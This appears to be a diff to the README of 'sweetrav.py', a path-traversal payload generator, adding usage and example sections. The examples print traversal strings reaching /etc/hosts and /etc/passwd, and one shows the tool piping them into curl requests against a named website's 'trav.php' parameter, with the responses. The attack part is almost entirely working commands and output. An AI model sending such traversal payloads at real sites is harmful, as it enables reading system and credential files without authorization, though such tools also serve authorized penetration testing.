@@ -1,3 +1,4 @@
+## Usage
 ```
 usage: sweetrav.py [-h] [-p PATH] [-d DEPTH] [-s SEPARATOR] [-r RANGE] [-a APPEND] [-A APPEND] [-f FUZZ] [-t] [-i]
 
@@ -30,6 +31,7 @@ options:
   -i                    use stdin pipe.
 
 ```
+## Examples:
 
 ```
 PS C:\sweetrav> python sweetrav.py -r 5-10 -A files.txt
@@ -51,4 +53,29 @@ PS C:\sweetrav> python sweetrav.py -r 5-10 -A files.txt
 ../../../../../../../../etc/hosts
 ../../../../../../../../../etc/hosts
 ../../../../../../../../../../etc/hosts
+```
+
+```
+PS C:\travmaker> python sweetrav.py -r 4-10 -a '/etc/passwd' -f 'curl "http://site123.com/?trav.php=FUZZ"' -t
+<a href="http://www.site123.com/?trav.php=../../../../etc/passwd">Moved Permanently</a>.
+
+../../../../etc/passwd
+<a href="http://www.site123.com/?trav.php=../../../../../etc/passwd">Moved Permanently</a>.
+
+../../../../../etc/passwd
+<a href="http://www.site123.com/?trav.php=../../../../../../etc/passwd">Moved Permanently</a>.
+
+../../../../../../etc/passwd
+<a href="http://www.site123.com/?trav.php=../../../../../../../etc/passwd">Moved Permanently</a>.
+
+../../../../../../../etc/passwd
+<a href="http://www.site123.com/?trav.php=../../../../../../../../etc/passwd">Moved Permanently</a>.
+
+../../../../../../../../etc/passwd
+<a href="http://www.site123.com/?trav.php=../../../../../../../../../etc/passwd">Moved Permanently</a>.
+
+../../../../../../../../../etc/passwd
+<a href="http://www.site123.com/?trav.php=../../../../../../../../../../etc/passwd">Moved Permanently</a>.
+
+../../../../../../../../../../etc/passwd
 ```
